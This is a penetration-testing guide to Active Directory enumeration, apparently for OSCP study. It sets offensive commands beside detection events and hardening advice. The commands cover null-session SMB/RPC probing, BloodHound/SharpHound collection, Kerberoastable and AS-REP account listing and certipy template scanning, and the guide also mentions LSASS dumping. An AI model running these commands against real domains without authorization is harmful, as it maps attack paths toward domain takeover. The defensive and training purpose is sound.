## 1. Overview

Enumeration is the phase that maps the AD attack surface: users, groups,
computers, trusts, ACLs, SPNs, and delegation settings. In mature
environments, most of this is readable by any authenticated domain user
(and sometimes anonymously), which is why AD enumeration is the highest-
leverage phase of an engagement.

**What enumeration answers:**

- Who are the users, and which ones are privileged?
- Which accounts have SPNs (Kerberoastable) or no pre-auth (AS-REP roastable)?
- Which computers are DCs, servers, or workstations?
- What are the trust relationships, and are they transitive?
- Which ACLs grant non-obvious rights (GenericAll, WriteDacl, DCSync)?
- Where is delegation configured (unconstrained, constrained, RBCD)?
- Which ADCS templates are enrollable by low-privileged users?

**Two operational modes:**

- **Unauthenticated** - DNS, SMB null sessions, LDAP anonymous binds,
  RPC endpoints. Limited but sometimes yields usernames or shares.
- **Authenticated** - the full attack surface. Any domain user can read
  most objects in a default AD.

## 2. Reconnaissance / Enumeration

**Offensive - unauthenticated:**

    # DNS SRV records reveal DCs and services
    nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
    nslookup -type=SRV _kerberos._tcp.dc._msdcs.corp.local
    nslookup -type=SRV _gc._tcp.corp.local

    # SMB null session / guest enumeration
    smbclient -L //10.10.10.10 -N
    netexec smb 10.10.10.10 -u '' -p '' --shares
    netexec smb 10.10.10.10 -u 'guest' -p '' --users

    # LDAP anonymous bind (rare but worth checking)
    ldapsearch -x -H ldap://10.10.10.10 -b "dc=corp,dc=local" -s base

    # RPC endpoint enumeration (null session)
    rpcclient -U "" -N 10.10.10.10
    rpcclient $> enumdomusers
    rpcclient $> enumdomgroups

**Offensive - authenticated (users and groups):**

    # netexec: domain users and groups
    netexec ldap 10.10.10.10 -u USER -p PASS -d corp.local --users
    netexec ldap 10.10.10.10 -u USER -p PASS -d corp.local --groups

    # BloodHound collection (the definitive AD enumeration)
    bloodhound-python -u USER -p PASS -d corp.local -ns 10.10.10.10 -c all
    netexec ldap 10.10.10.10 -u USER -p PASS -d corp.local --bloodhound --collection All

    # PowerView (from a Windows foothold)
    Import-Module .\PowerView.ps1
    Get-DomainUser -Properties samaccountname,serviceprincipalname,useraccountcontrol
    Get-DomainGroupMember -Identity "Domain Admins"
    Get-DomainComputer -Properties dnshostname,operatingsystem

**Offensive - authenticated (Kerberos and delegation):**

    # SPN-holders (Kerberoastable)
    GetUserSPNs.py corp.local/USER:PASS -dc-ip 10.10.10.10

    # AS-REP roastable accounts
    GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt

    # Delegation configuration
    Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
    Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto

    # ADCS templates and CAs
    certipy find -u USER@corp.local -p PASS -dc-ip 10.10.10.10 -vulnerable

**Defensive - what to monitor:**

- Bulk LDAP reads (enumeration of all users / groups / computers).
- `servicePrincipalName` queries outside normal business hours.
- `userAccountControl` bitwise queries (DONT_REQ_PREAUTH lookups).
- BloodHound-specific LDAP query patterns (SharpHound signature).
- SMB null sessions / guest authentication attempts.
- Anonymous LDAP binds.

## 3. Common Attack Vectors

Enumeration itself is not an attack, but it enables every AD attack:

- **Kerberoasting** - needs the list of SPN-holders.
- **AS-REP Roasting** - needs accounts with pre-auth disabled.
- **ACL abuse** - needs BloodHound-style mapping of GenericAll, WriteDacl,
  WriteOwner, ForceChangePassword, AddMember, etc.
- **Delegation abuse** - needs the delegation configuration per computer
  and user.
- **ADCS abuse** - needs the list of enrollable templates and their ESC
  misconfigurations.
- **Lateral movement** - needs the list of hosts where the compromised
  user has local admin rights.
- **Trust abuse** - needs the forest/domain trust map.

**Most productive enumeration targets:**

- Accounts with SPNs (Kerberoastable).
- Accounts without pre-auth (AS-REP roastable).
- Accounts with `DONT_EXPIRE_PASSWORD` or passwords in description fields.
- Groups with `GenericAll` / `GenericWrite` / `WriteDacl` on sensitive objects.
- Computers trusted for unconstrained delegation.
- ADCS templates with `Enroll` for Domain Users.
- GPOs with cpassword in SYSVOL.
- LAPS-readable computer objects.
- Exchange-related groups (Exchange Windows Permissions, Organization Management).

## 4. Exploitation Recipes

**Full domain enumeration with BloodHound (Linux):**

    bloodhound-python -u USER -p PASS -d corp.local -ns 10.10.10.10 -c all

    # Expected output:
    # INFO: Found AD domain: corp.local
    # INFO: Connecting to LDAP server: dc01.corp.local
    # INFO: Found 1 domains
    # INFO: Found 42 users
    # INFO: Found 12 groups
    # INFO: Found 28 computers
    # INFO: Done in 00M 12S

    # Files produced: users.json, groups.json, computers.json,
    # domains.json, gpos.json, containers.json, ous.json

**SharpHound (Windows foothold):**

    .\SharpHound.exe -c All --zipfilename corp.zip

    # Expected output: corp.zip containing the JSON collection

**BloodHound analysis (GUI):**

    1. Upload the zip.
    2. Run built-in queries:
       - Find all Domain Admins
       - Shortest Paths to Domain Admins
       - Find Kerberoastable Users
       - Find AS-REP Roastable Users
       - Find Computers with Unconstrained Delegation
       - Shortest Paths from Owned Principals
    3. Mark owned principals, find shortest path to Tier 0.

**PowerView (authenticated, from a Windows host):**

    # All users with SPN
    Get-DomainUser -SPN | Select samaccountname,serviceprincipalname

    # All users with pre-auth disabled
    Get-DomainUser -PreauthNotRequired | Select samaccountname

    # ACLs on a specific target
    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

    # Computers with unconstrained delegation
    Get-DomainComputer -Unconstrained | Select dnshostname

    # GPOs with cpassword
    Get-DomainGPOLocalGroup
    Get-DomainGPOUserLocalGroupMapping

**ADCS enumeration (certipy):**

    certipy find -u USER@corp.local -p PASS -dc-ip 10.10.10.10 -vulnerable -stdout

    # Expected output:
    # Certificate Authorities
    #   0
    #     CA Name                             : CORP-CA
    #     DNS Name                            : dc01.corp.local
    #     ...
    # Certificate Templates
    #   0
    #     Template Name                       : User
    #     Enabled                             : True
    #     Client Authentication               : True
    #     [!] Vulnerabilities
    #       ESC1                              : Enrollable by Domain Users

## 5. Post-Exploitation

Enumeration is not post-exploitation, but it feeds it directly:

- **Owned users** - mark them in BloodHound, re-run shortest-path queries.
- **Compromised hosts** - re-run local enumeration on each new host
  (PowerView, `net user /domain`, `net group /domain`).
- **Session hunting** - find domain admin sessions on compromised hosts:
  `Get-NetSession -ComputerName <host>` / `net session`.
- **Credential hunting** - after each new host, dump LSASS, search for
  `unattend.xml`, GPP cpassword, scheduled tasks with stored credentials.
- **Re-enumeration** - after each new credential, re-run BloodHound
  (the attack graph changes as you gain more rights).

## 6. Risk Context

The depth of AD enumeration possible with a single low-privileged domain
user is the single biggest structural weakness of Active Directory:

- A standard user can read nearly all objects in the domain.
- Attack paths (BloodHound) are computable in seconds.
- The attacker does not need to touch a single host to map the entire domain.

**Blast radius of enumeration:** none by itself, but it enables every
subsequent phase. In a mature environment, an attacker who obtains one
low-privileged credential can usually reach Domain Admin in 1-3 hops
because of accumulated misconfigurations.

**Why enumeration succeeds:**

- AD's default read permissions are intentionally permissive.
- BloodHound-style analysis reveals non-obvious paths (ACL chains, group
  nesting, delegation) that manual review misses.
- Most organizations have never run BloodHound against their own domain.

## 7. Root Causes

- **Default read permissions.** AD grants Authenticated Users read access
  to most object attributes.
- **Legacy protocols enabled.** NTLM, SMBv1, unsigned LDAP allow
  unauthenticated recon and relay.
- **Excessive ACLs.** GenericAll, WriteDacl, WriteOwner granted to broad
  groups during migrations or by mistake.
- **Service accounts with SPNs on user objects.** Kerberoastable.
- **Pre-auth disabled.** Rare but AS-REP roastable.
- **Unconstrained delegation.** Servers trusted to cache TGTs of any user.
- **GPP cpassword remnants.** Old Group Policy Preferences still in SYSVOL.
- **ADCS default templates.** Enrollable by Domain Users, allow client auth.
- **No monitoring of enumeration.** Bulk LDAP reads rarely trigger alerts.

## 8. Preventive Controls

**Reduce the attack surface:**

- Remove `GenericAll`, `WriteDacl`, `WriteOwner` from non-admin principals.
- Remove SPNs from user accounts; use gMSA for services.
- Disable pre-auth only where strictly required (never for service accounts).
- Remove unconstrained delegation; migrate to constrained or RBCD.
- Delete GPP cpassword entries from SYSVOL (`Groups.xml`, `Services.xml`,
  `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml`, `Drives.xml`).
- Harden ADCS templates (remove `Enroll` from templates that allow client auth;
  require manager approval for sensitive templates).
- Enforce LAPS for local admin passwords.

**Restrict enumeration:**

- Enable `Network security: Restrict NTLM` (audit, then block).
- Require LDAP signing and channel binding.
- Disable SMBv1.
- Restrict anonymous LDAP binds.
- Enable `Prevent users from installing printer drivers` (PrintNightmare).

**Monitor enumeration:**

- Alert on SharpHound-like LDAP query patterns.
- Alert on bulk `servicePrincipalName` reads.
- Alert on `userAccountControl` bitwise queries.
- Alert on SMB null sessions / guest authentications.

## 9. Detection Controls

**BloodHound / SharpHound:**

- Event 4662 (directory service access) with high volume of object reads.
- LDAP query patterns: `(servicePrincipalName=*)`, `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`.
- SMB connections to `\\<dc>\SYSVOL` for GPP files.
- JSON files written to disk on a workstation (SharpHound output).

**Bulk enumeration:**

- Event 4662 with the `List Children` / `Read Property` access mask on
  many objects in a short window.
- SAM-R / LSA-R queries (SAM enumeration) from non-admin hosts.

**RPC enumeration:**

- `rpcclient` / `enumdomusers` patterns (null session RPC).
- Event 4624 with `Logon Type 3` (network) and `NULL SESSION` account.

**SMB null sessions:**

- Event 4624 with account name `ANONYMOUS LOGON`.
- Event 4776 (NTLM credential validation) with machine account from
  unexpected source.

**DNS SRV lookups:**

- `_ldap._tcp.dc._msdcs` queries from non-DC hosts (reconnaissance).
- `_kerberos._tcp.dc._msdcs` queries from non-DC hosts.

## 10. Verification

**Offensive - did enumeration succeed?**

- BloodHound files produced (users.json, groups.json, computers.json).
- SPN-holders list non-empty.
- ACL abuse paths found (BloodHound "Shortest Paths to Domain Admins").
- ADCS vulnerable templates listed (`certipy find -vulnerable`).
- Delegation configured on at least one computer.

**Defensive - are enumeration controls effective?**

- Run SharpHound from a normal user - should generate 4662 events and
  trigger alerts.
- Attempt SMB null session - should fail (`STATUS_ACCESS_DENIED`).
- Attempt anonymous LDAP bind - should fail.
- Attempt `rpcclient -U "" -N` - should fail.
- Verify BloodHound Enterprise (or equivalent) has a baseline of the
  domain; any new edge should generate an alert.

## 11. OSCP Notes

- Enumeration is where OSCP AD machines are won or lost. Budget 30-40%
  of the exam time for enumeration.
- Essential Linux tools: `netexec`, `impacket` (GetUserSPNs, GetNPUsers),
  `bloodhound-python`, `certipy`, `ldapsearch`, `rpcclient`.
- Essential Windows tools: PowerView, SharpHound, `net user /domain`,
  `net group /domain`, `nltest /dclist:`.
- **Capture screenshots** of:
  - BloodHound graph showing the attack path.
  - The SPN-holders list.
  - The ACL abuse edge (e.g. GenericAll on a target).
  - The vulnerable ADCS template (if applicable).
- The `> [!IMPORTANT]` OSCP reporting note applies to any enumeration
  command whose output proves a foothold or path to escalation.

## 12. Production Notes

- Production AD environments are noisy: 4662 events are generated by
  default (with advanced audit enabled). Baseline before alerting.
- BloodHound Enterprise and PingCastle are the standard defensive tools
  for AD attack-path analysis; run them quarterly.
- Kerberoasting attempts are often detected because they generate RC4
  TGS requests in an AES-only environment.
- SharpHound's default collection is LOUD; operators in mature
  environments use `--stealth` or `--collectionmethods` to reduce noise.
- ADCS enumeration with `certipy find` is non-intrusive and rarely logged
  by default; enable CA audit logging to detect it.
- GPP cpassword remnants are the most common low-hanging fruit in legacy
  environments; check SYSVOL first.

## 13. References

**Microsoft documentation:**

- Active Directory Schema - https://learn.microsoft.com/en-us/windows/win32/adschema/active-directory-schema
- Group Policy Preferences - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)
- Kerberos Delegation - https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview

**MITRE ATT&CK:**

- Discovery - Account Discovery (T1087) - https://attack.mitre.org/techniques/T1087/
- Discovery - Domain Trust Discovery (T1482) - https://attack.mitre.org/techniques/T1482/
- Discovery - Permission Groups Discovery (T1069) - https://attack.mitre.org/techniques/T1069/

**Tools:**

- BloodHound - https://github.com/BloodHoundAD/BloodHound
- bloodhound-python - https://github.com/dirkjanm/BloodHound.py
- SharpHound - https://github.com/BloodHoundAD/SharpHound
- PowerView - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- netexec - https://github.com/Pennyw0rth/NetExec
- Certipy - https://github.com/ly4k/Certipy
- ADCSKiller - https://github.com/g0ldencybersec/ADCSKiller

**Research:**

- SpecterOps - BloodHound documentation - https://bloodhound.readthedocs.io/
- ADSecurity.org - Sean Metcalf - https://adsecurity.org/
- The Hacker Recipes - AD Enumeration - https://www.thehacker.recipes/ad/recon
